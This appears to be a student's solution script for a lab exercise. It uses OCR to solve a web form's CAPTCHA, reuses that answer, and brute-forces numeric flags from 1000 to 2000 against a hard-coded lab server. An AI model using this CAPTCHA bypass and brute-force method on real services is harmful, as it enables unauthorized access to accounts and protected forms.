#!/usr/bin/env python3
"""Bruteforce TP3 flag"""

import requests
from PIL import Image
import pytesseract
from io import BytesIO

URL = "http://31.220.95.27:9002/captcha1/"
CAPTCHA_URL = "http://31.220.95.27:9002/captcha.php"

print("=== BRUTEFORCE TP3 FLAG ===\n")

# Session
session = requests.Session()

# GET page
print("1. Chargement de la page...")
session.get(URL)

# GET captcha
print("2. Téléchargement du CAPTCHA...")
resp = session.get(CAPTCHA_URL)
img = Image.open(BytesIO(resp.content))

# OCR
print("3. Résolution du CAPTCHA...")
captcha = pytesseract.image_to_string(img).strip()
print(f"   CAPTCHA: {captcha}\n")

# Bruteforce
print("4. Bruteforce du flag (1000-2000)...")

for flag in range(1000, 2001):
    if flag % 100 == 0:
        print(f"   Testing {flag}...")
    
    data = {
        'flag': str(flag),
        'captcha': captcha,
        'submit': ''
    }
    
    resp = session.post(URL, data=data)
    
    if 'alert-success' in resp.text:
        print(f"\n✅ FLAG TROUVÉ : {flag}")
        # Extraire le message
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(resp.text, 'html.parser')
        success = soup.find('p', class_='alert-success')
        if success:
            print(f"Message: {success.get_text(strip=True)}")
        break
    elif 'Invalid captcha' in resp.text:
        print(f"\n❌ CAPTCHA expiré au flag {flag}")
        print("Le CAPTCHA n'est plus valide (timeout)")
        break
else:
    print("\n❌ Aucun flag trouvé entre 1000 et 2000")
